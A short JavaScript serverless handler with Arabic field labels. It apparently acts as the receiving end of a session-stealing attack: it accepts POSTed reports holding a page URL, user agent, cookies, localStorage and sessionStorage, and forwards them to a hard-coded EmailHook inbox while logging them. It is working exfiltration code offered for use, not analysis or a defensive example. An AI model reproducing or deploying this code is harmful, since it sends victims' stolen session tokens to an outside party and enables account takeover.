export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).end();

  const data = req.body;
  const readable = `
🔐 تقرير جديد – ${new Date().toLocaleString('ar-EG')}
━━━━━━━━━━━━━━━━━━━━
الرابط: ${data.رابط}
الوكيل: ${data.وكيل}
التوقيت: ${data.وقت}
الكوكيز: ${JSON.stringify(data.كوكيز)}
المحلي: ${JSON.stringify(data.محلي)}
الجلسة: ${JSON.stringify(data.جلسة)}
━━━━━━━━━━━━━━━━━━━━
  `;

  // ✅ إرسال مباشر إلى EmailHook (العنوان الجديد)
  await fetch('https://api.emailhook.com/v1/inboxes/cmke7e6at01zw14i4a34ojt8e/emails', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ subject: 'تقرير جديد', text: readable })
  });

  console.log('🔥 EmailHook sent:', JSON.stringify(data, null, 2));
  res.status(204).end();
}
